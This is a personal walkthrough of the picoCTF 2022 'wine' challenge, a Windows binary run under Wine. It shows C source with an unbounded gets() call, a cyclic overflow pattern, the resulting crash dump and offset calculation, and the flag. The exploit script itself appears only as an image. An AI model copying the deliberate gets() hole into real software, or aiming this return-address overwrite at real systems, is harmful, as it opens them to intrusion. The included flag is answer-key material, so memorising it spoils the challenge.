#pico2022 #binaryexploitation 

## Challenge:
```md
Challenge best paired with wine.
```

This challenge launches an instance.
```md
Challenge best paired with wine. I love windows. Checkout my [exe](https://artifacts.picoctf.net/c/400/vuln.exe) running on a linux box. You can view source [here](https://artifacts.picoctf.net/c/400/vuln.c). And connect with it using `nc saturn.picoctf.net 51035`
```

## Process:
Download the files.
```bash
curl -O https://artifacts.picoctf.net/c/400/vuln.exe
curl -O https://artifacts.picoctf.net/c/400/vuln.c
```
#curl 

View the source.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void win(){
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("flag.txt not found in current directory.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

void vuln()
{
  printf("Give me a string!\n");
  char buf[128];
  gets(buf);
}

int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);
  vuln();
  return 0;
}
```
#c 

There I see **gets(buf)**. Let's modify the source a bit.
```c
...
int main(int argc, char **argv)
{
  printf("Vuln addr: %p\n", vuln);
  printf("Win addr: %p\n", win);
  setvbuf(stdout, NULL, _IONBF, 0);
  vuln();
  return 0;
}
```
#c 

Let's find the **win()** function address.
![[052_wine-0.png]]
#objdump #grep 

```
00401530 win
```

Running the program.
```bash
wine ./vuln.exe
```
#wine

Passing this overflow pattern:
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
```

Gives me:
```
wine: Unhandled page fault on execute access to 37654136 at address 37654136 (thread 0024), starting debugger...
Unhandled exception: page fault on execute access to 0x37654136 in 32-bit code (0x37654136).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:37654136 ESP:0067fe80 EBP:65413565 EFLAGS:00010246(  R- --  I  Z- -P- )
 EAX:0067fdf0 EBX:00270eac ECX:0067fd80 EDX:ffffffff
 ESI:00000050 EDI:0011803c
Stack dump:
0x0067fe80:  41386541 61413965 31614130 41326141
0x0067fe90:  61413361 35614134 41366141 61413761
0x0067fea0:  39614138 41306241 62413162 33624132
0x0067feb0:  41346241 62413562 37624136 41386241
0x0067fec0:  63413962 31634130 41326341 63413363
0x0067fed0:  35634134 41366341 63413763 39634138
```

Conversion:
```python
#!/usr/bin/env python3

import codecs

h = codecs.decode('37654136', 'hex')
print(h)
```
#python 

```bash
python conv.py
```
#python 

```
b'7eA6'
```

Which would be:
```
6Ae7
```

![[052_wine-1.png]]

And here's the exploit.
![[052_wine-2.png]]
#ipython3 #python #pwntools 

Flag given.
```bash
echo "picoCTF{Un_v3rr3_d3_v1n_acdf9f0a}" > flag.txt
```
#echo 

**Flag: *picoCTF{Un_v3rr3_d3_v1n_acdf9f0a}***
